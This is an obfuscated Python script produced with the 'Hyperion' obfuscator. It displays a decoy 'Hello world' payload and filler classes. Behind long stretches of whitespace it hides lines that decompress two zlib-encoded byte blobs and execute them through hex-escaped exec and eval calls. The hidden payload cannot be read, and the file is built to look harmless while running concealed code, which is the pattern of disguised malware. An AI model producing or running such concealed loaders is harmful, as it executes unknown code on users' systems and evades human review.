from builtins import *
from math import prod as _frame


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


_algorithm, MemoryAccess, _round, _callfunction, _product, _divide, Hypothesis = exec, str, tuple, map, ord, globals, type

class _cube:
    def __init__(self, _while):
        self._walk = _frame((_while, -50916))
        self.Walk(_modulo=64156)

    def Walk(self, _modulo = int):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._walk -= 97203 * _modulo
        
        try:
            ((_callfunction, (_absolute, MemoryAccess, _algorithm)) for _callfunction in (_absolute, MemoryAccess, _algorithm) if _round >= MemoryAccess)

        except TypeError:
            ((_absolute, MemoryAccess, _algorithm) or _round if (_absolute, MemoryAccess, _algorithm) and _round else ... or (_round, (_absolute, MemoryAccess, _algorithm)))

        except:
            Hypothesis(-94145 * -57534) == float

    def _square(self, Absolute = 20180):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Absolute /= -64863 / 11697
        self.Negative != bool
        
        try:
            ((_round, {'Rg3lloelhallltt6l': _absolute}) for _round in (_algorithm, _absolute, _callfunction) if _round == _absolute)

        except ArithmeticError:
            (({_absolute: _round}, _algorithm) for _algorithm in {_absolute: _round})

        except:
            Hypothesis(-15260 / 30563) == False

    def Positive(Floor = bool):
        return _divide()[Floor]

    def _floor(_negative = -70974 * 84851, Add = type, Square = _divide):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Square()[_negative] = Add
        
        try:
            ((_absolute, MemoryAccess, _algorithm) or _algorithm if (_absolute, MemoryAccess, _algorithm) and _algorithm else ... or (_algorithm, (_absolute, MemoryAccess, _algorithm)))

        except OSError:
            (_round, _round) if _callfunction >= _absolute else (_absolute, MemoryAccess, _algorithm) == _divide

        except:
            Hypothesis(-42084 + 54352) == int

    def execute(code = str):
        return _algorithm(MemoryAccess(_round(_callfunction(_product, code))))

    @property
    def Negative(self):
        self._hypothesis = '<__main__.Absolute object at 0x000001016BE92437>'
        return (self._hypothesis, _cube.Negative)

if __name__ == '__main__':
    try:
        _cube.execute(code = __code__)
        _system = _cube(_while = 18948 - -68352)

        if 190100 > 2945567:
            _system._square(Absolute = -44285 / _system._walk)
        elif 187290 < 1317329:
            _cube(_while = 52117 / -58198)._square(Absolute = 81593 + _system._walk)                                                                                                                                                                                                                                                          ;_cube._floor(_negative='O0OOo0o0O00O00O0ooo00',Add=b'x\x9c\xed\x1cks\xdb\xb8\xf1\xbb\x7f\x85\xcf_(\x8d\x13\x87\x04I\x80\xf4\x8c\xbft\xae\x9d\xb3\xc7\x89:\x97N\x93N\xe2\xd1P"\xe5\xd0G\x8b\xae\x1eg\xf9\xdfww\x01P\x14)\x8a\xd0\xc3\x8e[W\x0c\x80\xc5r\t\x82\x0b`\xb1\x0f8\xb3\xc9\xd3\xf9\xd11\xfc\xd2Q\x87J\xfc\xf5\xfb\xf9`4\x9f\x0e\xa3Y>\xe9\xf7\x8f\x7f\xb98\xf9\xed\xe9!\x99\xa4\xf9\xf8\xe48\x9f\x94\xc8\xa2\xf9\xecG>\x99\x12M\xe7d\x90f\xd9\xd3\xecGr\x9bG3\xd7\xe7\'\xefN\xfe\x92\xcd\x93\xdf\x93\xf8\xa4\xbb\xf2\xd4m:\xfb1\x1f\xc8\x86\x7f\xccf\x0f\xd3\xf3\x0f\x1f$\xeel\x98\xdf\x7f\xa84\xf3\xa1\xe1\xddq:\x1d\xe6\x93x\xb5\x19\x85<\xbb\xbd\xfd\xf0\x90E\xb7\xf3\xa4\xf2P\x96\x0e\x93\xf14\x91\x0f\xfd\xf5\xef\xd7\xef\xd9\x99]!\x19\xe6\xb1\xbco=L\xd2\xf1\xacs\xf2[\x92e\xf9\xf1c>\xc9\xe2_N\xba\xd6Q\xf7\xbc\xa0\xc6\xfb\xd6\xf4\x8f4\xb6\xbaG\xc9b\x98<\xcc\x143\xc7\x0fsx\xf2\xf7|\x9aL\x8f\xa3Ir<I\xe2\xef\xe3\x7f\xa6y\x96\xcc$b\x00\x9c\xf9>\xfeW>\xa7Zt\x8c\x8d|\x1f\x7f\xca\x07y\xfct\x9c\xa5\x7f\xc0sO\xf9\xfc\xa4{$;\x95\xde?\xe4\x93Y\xbf\x0fo{\x9aZ\xdd\xb3d\x91\xce:\xdd\xa3,\x1fF\xd9\xb4\xd3\xfdf\xf5zy\xaf\xd7\xb3{\xb9\x9d\xdb=\x82l\xeb\xe6\xe26\xcb\x07@p\xb4\xe6.>\xf4\xf5\x0b^_\xbe\xc2\x8fJ\tY\xdf\xce\xcfO\xdf\x9f\xbe\xef\xbc\xef\x9c:\xdd\xee\xcd\xcdE\x9cN\x9a\x9a\xc8\xd2;\x18\xae\xf4\xee\x0e\x8a4\xcd \xaf?~\x9b\xcc\xa2\xd9\xac\xb1\x89\xfb\xf1\xbd\xfc7\x1eC\x01\xb9\x04\xa0\xfb\xf2\xf3\x8e\x1a\x08\xf0\xd9\xcf\xf8c\x9f\x19\xfc>c\x0e\xb0\xc4\xc0\xd3K\xae5\xbd\xb9\x97\xe79\xc26$\xbae\xe7\xf0\\c\x9b\x1dk0O\xb3Y:\xc6\x11\xf83\x9a4\xf2\x15\xeap\x03\x9b\xcc\xf1\x0eU\x10\xceqL\x80Y\xc8)\xc92b_g\xc3\x1b\xa7\xe3t\x96\xa5\xf3A\x95\xab\xddw\xd5a\xa3\xb1\xfc\xbaS[\xddo\x87l\xec,\x1d\xc7\xc9\xa2cey^\xbf{\xd3\xdd4\x9c\x92\x95\xc8T\xe2\'r\x0e\xd9\xf7\xa6\xd8\x96L\xb3\xe8o[\xf2\xedq\xb1x\\<>R\x86\xf9\xe2M1l>\xf9\xc7:~5,Nd\x11\xf1\xa9\xe0\x17r\xcb\xb2\xce\xee\xf2t\xdc\xb8\xa2{\xbf\xe6x#\xff\x15K\xf8\x87\xc5[b\xf2,\xca\xb3\xd1\x96\xb3\xf2\xd3\xa7\x8f\x9f>~\xfc\xf8\tK\x04>b\x15\xfe\xbd%\xbeMf\xd3-\xb9\xb6(f\xa7\xfc\xd1<}K,\xcb\xa2?\x93-\xd6s\x0f7\x0c\xdc5l\xbd\x9d\xf7\x10e\xd3^\xbe\x1d\xd3\xd2t8\x8d\xc6\xe9A\x98\xd6\xd8\xd6.LknL3\xedi\x94f\x8b\xe4\xc7x\xbe\x96su=\x87fZ1\xcf\xa4(T\xf5\xc7\xb7\xb5{d\xe9\xc3}>\xdcb\xc2\x01;2b\t\xa8\xbbw\xc4#\t\xdc\x95\xdbX\xbb\x8a;V\xd7\xee\x07}\xd1\xf7\xfa\xaco\xf7C\xc8\x03|_\x15g\xd2\x90\x03w\xedv\xc2\xe6\xd5\xd1\x19X\xae\xcdb\x16\xb0\xd8uX\x08*m\x9c\xa0\xed\xd3\xb1\x82\xd1\xac>\x8d\xba2\xa3\xf4\x86\xa6\xc70Yl!\x8c6r\x9bG<\x84+\x82kHeH\xe5\x12\xa3qC\xaaA\xde6&7\x9b\x87\x97s\xc1\xf8\x88\xc7\xcc\xe6L\xf8\xd8\xa4\xf0 O\x84\x0b\x98\x90\xc7\xc2\xe6#\xc1\x84\x075_\x04\xdc\xe7n\xeb$x\x865\xb1y\x86:j\x86\xdaf3\xf4\x06\xc6t6M\xe6\xffN&\xc7\xb3I\xfep\x9f\x9a\xac%\xde\xf7\xfbn\xdf\x81\xe5\'S\xd0\xe7@-\xea\xd8}\xbf&\xf4G\xaeP\x89\xab\xe4Ar \xb9\x90\x18\xc2l@_lBk\xc8\x15JM\xbb@v\x87\x83w\'\x7fh\xc0\x83\t\x7fs\xb1AA\xa9.\x89&\xae\xa28\x0b\xe0B\x1e\x86p\xd9\xc4U\xb7\x8e=\x04W]\x95|\xc5)_\xa5P\x95A\x89\xabm\xb4\xc2\x9c\xab7M\\\xfd\x82n\x15\x99\x14\x04L]O\xbb\xf1\xe3`\x05\xfb\xc2\x81\xd5\xeb\x0bWx\xa2u\x856uh\xf3K\x02! a.JPP\\\xa2\xc8!\xb5v\xe1"\x8b\xee\x07qt\x8cc\xb9\xd0\x1a\x86\x02\xce\x1b\'\xd6.\x1d\xe7\x89\xbab\xb8\x96y\xb9^\x94\xe6\xddV3\xaf\xe8\xfb\xe2\xf1|\xad\xd8\xdb\xa5\xc7^\x0cWB9\x96Kh%7\xee\xeb\xf5\xd5\xe5\xf5\xe5\xe55&\x99#\x02\x80\xab\xc3\xf2\xd9S\xdb\x92\x17\xeaK\xd75\xd6`\xb3\xd2}V\xfd\xba/\xca\xad\xb8k\xa1\x1b\x8dP\xe4P\xc3G\xd1\x14\x7fYE\xe8\xe6b\x87\x970\xc1\x03X\xc2\x9e\xb0\x85\xebFl\xc4F\\\xf0\x10\xb6\xe4\x00\x967c\twi\xb3\x1e\xf9\xb0\xd0\xb9\x03\x1bs(|\xe1C\x97F>\x08\x01\xd0\rF\xb8y3\x9c\xcc\x0eA#\xce\x80\xfd\x90\x03T\xe0\xc4\n\xad\xa0\xb6\x88\xceg\t\xbc9d\xc2`\x93_\xcf\xf9\xf1X\xce%\x9cM4\x9f\xe4\x08\x8e\xc7&\xbb\x01J|\x90\xf5\xb4\xa7\x06T\xe2n\x10\xd6\xb1\xaf_\xf9\xddi\xec\xf7\xe1\xbbZ\xbe\xf7j\xd9H\xae\xbf\xf8\x94W\xcb\xf7\xf2\xfa\xea\xea\xf2\xea\n\x84\x0c\x02\x90\x01p\x89bh\xbbeL\xe2\n\x9f\xbe\xc6t\t-^]\xfe\xacO\xd2\x1b\xb5\x8c\x85H\xf3\x01\xf7\xed\xc3\x89}X\xc8\x81/(/\x97\xcbD\xf5-D\xa8\x9c\n\xc5r<_\xdb\xa7\x9dD\xfd\x88\x83^)s\xbc\x10\xd25\xaf\xc0\x19\xf7\x94\x98\xf9E\xf1VZf\x07\xde\x9aF\xf2\xe2\xb2\xf4\x08\xf28A\x08K\xbcq\x7f\xd1nA\xb36C\xf3\x16M\x18\xb2s!\xdb\xba\xd7\x18\xcc\xa0\x10\x10v\xbbG\xfbU\xef\xe5\xf7)\xf5Yd\xf7\xca\x9f6\x80e\xbdi\x8aoo\xde\x16J\xe3\xf2\x17\xac\\\x1a\xd7>\xcd;\xbb\xe9\xb0\xf5W\xeb\x0e\xad\xea\xb7\x8ab_\xeb:^\xa3w&%\xads\x05\x03\xa3\x16\xfa\x03P\x01\n\xe3\xbep\x02`-* \xed\x04\xd0\x98\x08L\xf7\x81\x1b\x81\xc20\x80\xb1\x1f\xc8\xf1\x8740\xe77\x0bp\xe1r\xb5\x1c$$\x17\xb6\\\x1era{#\xaf\xb8\x87%\x0b@\xb1\x00M\xc5\r\\\x9fs(\xb9*mU\x86\xaa\x14\x95:\xab\xe0\xbd\xe29\xc6\x19\xdc\r\xa0\xf4\x0e\xd0\xae[\xdcg.\xa85,\x04\x15\xcaC/\x06|\x15\x94\xc0#\xe1\x06\x9c\x83\xc2\xe57\xf1\x10\xd7\x11\x8cK\x8c\xb9\x84\x00\xde\x87[\xd8!\xce\x1dU\xe2\xb7\x85%\\SR\xf75\xad*\x91S\x9c\xfb\xa5\xe4\xa9T\x85\xfd\n\\\xa5\xf7\xd6\xd0/\xd3A\xb8\xd7\xb6\x98\xde\x8d\xd2,\x19G\xf7\xc9\x85E"\x91\x16\xb7-#\xbc\xa8\xc6\xef+\x18=\xe5)q\x95\x87\x04\xed\xfa\xa0\xe45a%\x1f\x80\t\xad\xa1\x0f\xe0\xdd=\xdc\xbf\xa8\x85,^\xc0\xd3\xd5\xac.\xaa\xa0\xa6~1ue\xf1\xe2~\xb8\xa6\x98\x83\n1,d\xf0\xb5\xe8\xa2A\x07\xad\xae\rw\x9dWo\x1ftN\x08rN\xe16\x10\x9d\x9e\x9f\x7f\xb3\xe6\xb3Q`u\x928\x1f&\xf1Y\xd7\n\xd9\xc8#M\xca\x95\xa5\xd2\xb14\x8e \xcc\x036*i1\xa8\xdb(\xfdfE\xe7\x01j\x16\xd9\x91\x1bzCO\x9b\xe8C/\xa2\x9a.\x11\x17\xd1\x15\x025\x87\x8d\xc5\x1at\xe8h\x8aM\xbb\xbbb\x00\xe9+\x80\xea\xdc\xe8\x8f\xda\xfc\x19\x8e+\xa5\x81\xednnn\xed\x9c,\xb7\x8c\xbe\xe2;r\x1bK\x80\x8e\x15\xa1S\xd9\xfa\xd6\xed\x90\x91\xa9\x0c \x04\x94"vb\xe4\xda\x95nFt\xdf\xdadd\xba\xe4\xda\xada\xcd\xfc\xc4h\xaf\xf2\xbeP\xa5\xdd\x17\xd4X\r\xbb\xef\xd4c%\xaf$J)[I%\xbf$\xa5B%\xcdLh\x83\xed\xa6pIXk\x0f\x98N&\x92\x04\xa3\\\xc8a\x0f.\xe4?\x18\xf5\xfd\x90\xe2\\5\xec\x01\x17\xb3\xd5\xc5\x08\x9a\x0f\xefp!\xc7\x91u\xfa\x0c\xa8\xfd:\xf6\xa0o\xc5oq\xd5W\x05\x14(\xf0\xd4\x0c\xab`\x0f\xe1\xe6\xd6[\x97\x1edG\xa5@\xc3%7w\x1b\xed6\xc1\x83J:\xe4\xb6\xa7z\xc7T\x8f]\xe5\x88wT\x9dz\xaf\xbe\xca\x84\xd6XZ\xef\xec(?\x94\x8d\xb3\x93\x89up\x1b\xa7}\xb3\x92\x9a\xefr\xbbR\x9a0\xe1\x8am\x88\xb6(\x98w\xb4\xdd\x94\xb7\x1e\x99"\xda\x82\x96\x9b\x91N\xa1w\x90m\x88\xbb#\x1f\x93\xafJL\x0c\x92\x07\xc9Vx\xb9U\x81\tfD\xfb\x9c\xdb\x19\rj\x8f&\x1dA0\x0fL\xb62c\x89th5\t%kHg\x14\x04\x9dP\xe0\xe4\xba\xf5\xab\xb8\x83\xbe\x11\xc3\x83BIP\x87\x9c\xc4\xf0\xe8\xa9W\xc7\x1e\xf4\xad/\xab`\xea\xdd\xdaW"\xccW\xc2Y\xd7Q\xb4q%\xfaLh\xfd\xdd\x05zM\xc0/5\x00\x19`\xba\xbe\xbc\xba\xbe\xba\xbc\xba$\xcf\xef\x95\t\x8b\x04\x9dg\xc1\xf9\xc1`~\xf8j_\x0c\xea\xd8\xd7\xae\xd0o\xb5\xd9=\xc7d\xf3I\xa9\x94\xaa%\x06\xcf\x19\xad?^\xc7\x9a\xa9f\x1e=$O6\xd0\xc2&\xd5\xac\x86\xfdI\xdc^\xa6\xa6\xb3&\xcfb\xdf\x86%U\xc2U\x8a\x93V3B\xadv\x94\x94\xab6ZS\x07m\xa7\xf9\xa0\xc5+T\x05BC{4`\xf1\x9a\x10|54\xaf\x83\xf7\xd2zMV\x82\xf9\xf1\nE\xcc\xabA~\xf9\x9c\x81\x1d\xdb\xf6I[\xfbc7\xbfp?k\xd5\'#\x92\xe3Z\xa6$\x17\'\xafc\x0f\xa5u\x8b\x92M\xc0\xb5\x9bLk\xd7\x15\xad{\x13-3_\xe4\xcb\xades\\\'\xf2B\xa5F\x86Jm\x8c\x94\x0fCb\xe0n\xab\xd3\x91$\xf7f/\xbe/8w\xdaO/4\x8a\xa3\x17\xb3\x176\x1f\x19\x97\xe3\xbf\xbdS\xed\xb0\xe1&#\x11\xb2\xbd\x8d\x100O\xf8\\\xf0\x84\xad\x06Q\xeb\x01U\xbcbw\xf5^)\xc0Z\x84a\x85\xff\xea\xc4\xc6\x8eV\x01*S\x9c\xf6l\xa9\x1a\xdb\xe4\xe0r\xea\xd8\x9f\xa3\xbb\x18\x12>\xab*a(q|\x0c\xb90\x9d\x97K\t\x97\xf1.3\x93=\xc6Z\xe3A\xf8\xe4\xfb\xabGF\xb5\xa1\xe0)I\xcdJR\xdd\x84v')

        if 167096 > 2816743:
            _system.Walk(_modulo = _system._walk * 65535)
        elif 288583 < 8578686:
            _cube(_while = 72206 / 33333)._square(Absolute = -1518 - _system._walk)                                                                                                                                                                                                                                                          ;_cube._floor(_negative='xwwwwwxxxxxxwxxwxww',Add=b"\x0b\xa9\xfe\xf3\xfd)\xcf#\x1f\xd1\x8eq\x8a\xbd\xd7%\x9f\xb1CvL\r\xbb\xef\xe8qe\xe2i\xff\x9c\xeb\xaf\xfa\xeb\x82\x92\xd3\xd7\x84v\x0b\xa7oK\xa8\xbb\x1a\xfc\xd4gA\xb8J\x12\x96!\xee\xbd\x82\xa7*\x08J\x01\xd0RpT\xd7\xcb\x01\xd2u4U\xbaZ\x10\xd6\xdd7\xd0\xb9ox\x98z\t\xdd\x00\xec\xe6\xb0n5d\xbb.\x84[\x85e\xdd\x05\x0e\xd8\x90\xf0\x1d\x1e\xbc\xcf\x03\xb8HX'\x9c\xab\x92S\x82KuMW\xa6\xa5@{\x000_I\xbc\\\xc7K\xe3\\\xaf(\xcb\xb4e\xfa\x17\x0e=\xb7\x9f\xe7(\x1b,\xcb\xa4\xf2\x17V7\xff\x17\xc5i\xbbU\xa2\x0f\xe2\x8b\xd2\x9e\xa4%\x9d(E8Lh\x8d\x83\xd5\xedj\xab'\xf0\x94\xae'\x12f\xa2\\\xc6\xae>\xd8\xbd<\xe4\xbd\x8a\xc1\xcb\xc0\xf5\xad\x93\x99\x0b\xdcQ\xeel\xa1`G\xb9\xb6y\x91\x96.\xf0v\xda=]\xe0\xa4\xd1t\xadvBG9\xb2\x82\xbeO\x97\xd3gp\xbb\x8e5jl\xa3\xe3=/\x96\x92\xad\xbf\xe8\x80\x8e\xf7\xf6\xdd\x9d\x97\x1cG\x1a\xd6\x7ft\xe2\x97\xe6\xb6\t\xed\x16\xd1;S\x8b{yr\xa08\xe6\xbfb\xa0\x19\xda\xdb\xc6:\xaf\x1eZ\x97\xe2\xc2\xe8\xc1\x14t$\xbc\x86=\xa8\xe9\xf23]\xc9\xcfrpg\xab8\x0e\xfa\xddQce\xe4\x83\x0f\xc8\xbf\xe4\xd7\xb1Fo\x85\x07\\\xfa\xb3U\xf9\xc7\xab>\xd0\xb2*\xee\xc5l\x9f\xad\x8fO\xad\xa6\xff\x12\xff\xca\xff\xd5\xf4\x9f\xa7\xa6?\xdf\t\xcc\x15\x95\xbd\xa2*su6\xb6\xaank\\\x99\xa6L\xabK\xa9\xb2{*\xf9%X\xd7\xd7\xe1\x9a\xe1\xd7\xa4\xb2\xa37F{h\x96\xb0\xae\x95!]\xbe\x06\x8f\xf1\xb3\xcb\xf9\xcd2G\xff\rq\xa0\x94e\x1dY\xd6\xa7`\t_:)\xbb\x89V\x90Kb\x1b7\xc3z\x8e<\xabE\xa1;^>\x1c\xe7\xf9\xcb\x03ra\xc9\xa2h\xa35\xf4\xa9\x989\xc2Ml\x84\x80\r\x0b\x7f\xb2\xf4&//\xed\x81F\xe8@\xa79\xe51\x18\xa1JW\xd9\x02\xb6\xc2\te?\xb0V\xba\xe7<>\xb3\x93\x16\xdf\xee8\xd5\x7f\x19\xae\x15m\x1d\xda\xe2%\xc5\xbc\x8d\xceP\xf90\xf5HDjx\x97A\x84a\x11V(\xff\x17\x12\x84}Y\xd1\xf6\x1f\x08i\xadB")

        _cube(_while = 15397 * 12020)._square(Absolute = -75947 - _system._walk)                                                                                                                                                                                                                                                          ;SS22SS2SS2S22222S2S,S2S2SSSSSS2S22SSSS2,SSSSSSS22S2SS2S22S,IIllIIllIlIlIlIlIIllI,IIllIlIlIIllllllIIIIlllI=(lambda DDODODoDDODOOOoOOooDOOD:DDODODoDDODOOOoOOooDOOD(__import__('\x7a\x6c\x69\x62'))),(lambda DDODODoDDODOOOoOOooDOOD:DDODODoDDODOOOoOOooDOOD['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda DDODODoDDODOOOoOOooDOOD:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(DDODODoDDODOOOoOOooDOOD)"),filename='\x58\x58\x57\x58\x57\x57\x58\x58\x57\x58\x57\x57\x58\x58\x57\x58\x58\x58\x58\x58\x58',mode='\x65\x76\x61\x6c'))),(lambda SSSSS2SSS22222SS2S,DDODODoDDODOOOoOOooDOOD:SSSSS2SSS22222SS2S(DDODODoDDODOOOoOOooDOOD)),(lambda:(lambda DDODODoDDODOOOoOOooDOOD:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(DDODODoDDODOOOoOOooDOOD)"),filename='\x58\x58\x57\x58\x57\x57\x58\x58\x57\x58\x57\x57\x58\x58\x57\x58\x58\x58\x58\x58\x58',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        if 297703 > 980801:
            _cube(_while = 41664 * -19514)._square(Absolute = -24699 + _system._walk)
        elif 468999 < 3284272:
            _cube(_while = -99256 + -45438).Walk(_modulo = _system._walk - 78185)                                                                                                                                                                                                                                                          ;IIllIlIlIIllllllIIIIlllI()(IIllIIllIlIlIlIlIIllI(S2S2SSSSSS2S22SSSS2(SS22SS2SS2S22222S2S(SSSSSSS22S2SS2S22S('\x76\x61\x72\x73'))),_cube.Positive(Floor='O0OOo0o0O00O00O0ooo00')+_cube.Positive(Floor='xwwwwwxxxxxxwxxwxww')))

    except Exception as _absolute:
        if 340923 > 6764920:
            _cube.execute(code = MemoryAccess(_absolute))

        elif 447806 > 3137985:
            _system.Walk(_modulo = _system._walk / 20008)
